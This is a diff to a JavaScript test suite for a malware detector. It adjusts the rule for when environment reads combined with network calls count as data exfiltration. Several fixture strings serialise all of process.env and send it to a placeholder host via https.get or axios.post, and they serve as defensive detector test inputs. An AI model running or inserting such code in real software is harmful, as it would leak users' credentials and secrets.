@@ -125,7 +125,14 @@ describe('Threat Detection', () => {
       expect(types.filter((t) => t !== 'CAPABILITY_NOTE')).toHaveLength(0);
     });
 
-    it('flags env read combined with network send as DATA_EXFILTRATION', () => {
+    it('does not flag a single env key read next to network use (config, not harvesting)', () => {
+      const code =
+        "const https = require('https'); https.get('https://x.y/?k=' + process.env.API_KEY);";
+      const types = detectMalware(code, 'lib/a.js').map((t) => t.type);
+      expect(types).not.toContain('DATA_EXFILTRATION');
+    });
+
+    it('flags the whole env serialised and sent as DATA_EXFILTRATION', () => {
       const code =
         "const https = require('https'); https.get('https://x.y/?e=' + JSON.stringify(process.env));";
       const t = detectMalware(code, 'lib/a.js').find((x) => x.type === 'DATA_EXFILTRATION');
@@ -157,13 +164,13 @@ describe('Threat Detection', () => {
     it('recognises import(), node: prefixes and third-party network clients', () => {
       const code = `import axios from 'axios';
         const { userInfo } = await import('node:os');
-        axios.post('https://x.y', userInfo());`;
+        axios.post('https://x.y', { ...process.env, u: userInfo() });`;
       const types = detectMalware(code, 'lib/a.js').map((t) => t.type);
       expect(types).toContain('DATA_EXFILTRATION');
     });
 
     it('demotes combinations in test files to LOW', () => {
-      const code = "const https = require('https'); https.get('u?' + process.env.TOKEN);";
+      const code = "const https = require('https'); https.get('u?' + JSON.stringify(process.env));";
       const t = detectMalware(code, 'test/a.test.js').find((x) => x.type === 'DATA_EXFILTRATION');
       expect(t?.severity).toBe('LOW');
     });
